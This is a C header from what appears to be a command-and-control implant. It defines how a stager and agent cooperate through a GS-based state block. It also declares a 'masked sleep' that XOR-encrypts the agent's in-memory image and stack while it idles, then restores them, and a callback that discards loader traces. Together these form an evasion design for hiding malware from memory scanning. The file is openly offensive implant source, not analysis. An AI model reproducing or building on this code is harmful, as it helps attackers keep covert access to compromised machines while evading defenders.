#ifndef C2_STAGER_IFACE_H
#define C2_STAGER_IFACE_H

/*
 * stager_iface.h — same-process cooperation ABI between the stager and agent.
 *
 * The stager publishes its mask entry point, a ready callback and a mask
 * report in the state block it installs as the x86_64 GS base (see stager
 * state.h). The agent binds once, reports readiness so the stager can drop its
 * loader blobs, and writes its stack pointer into the report before each
 * sleep.
 *
 * The mask function makes the agent ELF writable, XORs it in place with a fresh
 * random key, sleeps, and restores it before returning. The agent MUST have
 * joined or stopped every other thread first: the mask runs on this thread and
 * nothing may execute agent code while the image is masked.
 */

#include <stddef.h>
#include <stdint.h>

#define C2_STAGER_ABI_MAGIC 0x53475031u
#define C2_STAGER_ABI_VERSION 2u

/* Agent -> stager mask report, written into the stager state block before each
 * mask call. The state mapping is excluded from every masked range, so the
 * stager can read the report while the agent sleeps. */
struct c2_stager_mask_report {
  uintptr_t stack_sp; /* current agent stack pointer */
  uint32_t flags;     /* C2_STAGER_MASK_* */
  uint32_t reserved;
};

#define C2_STAGER_MASK_READY 0x1u       /* agent owns the process */
#define C2_STAGER_MASK_STACK_VALID 0x2u /* stack_sp is valid */

typedef int (*c2_stager_mask_fn)(unsigned seconds);

/* Drops the loader blobs as soon as the agent binds. Called once by
 * c2_stager_mask_bind() after the report block is validated. */
typedef int (*c2_stager_ready_fn)(void);

/* Prefix of the stager state block installed as the GS base. The first field
 * must stay the self pointer because get_stager_state() reads %gs:0. The
 * report is written by the agent and read by the stager mask stub. */
struct c2_stager_public {
  void *self;
  uint64_t abi_magic;
  uint64_t abi_version;
  c2_stager_mask_fn mask_fn;
  c2_stager_ready_fn ready_fn;
  struct c2_stager_mask_report report;
};

#ifdef __cplusplus
extern "C" {
#endif

/* Read the mask entry point from the stager state block. 0 when installed. */
int c2_stager_mask_bind(void);

/* 1 when a mask stub was published by the stager. */
int c2_stager_mask_available(void);

/*
 * Mask this process's agent image for `seconds` around a sleep. The agent
 * writes its stack pointer and the READY flag into the stager's mask report
 * before calling; the provider masks only the live stack frames and drops the
 * unused part of the stack mapping. Returns 0 only after a full
 * mask/sleep/restore cycle.
 */
int c2_stager_masked_sleep(unsigned seconds);

#ifdef __cplusplus
}
#endif

#endif /* C2_STAGER_IFACE_H */
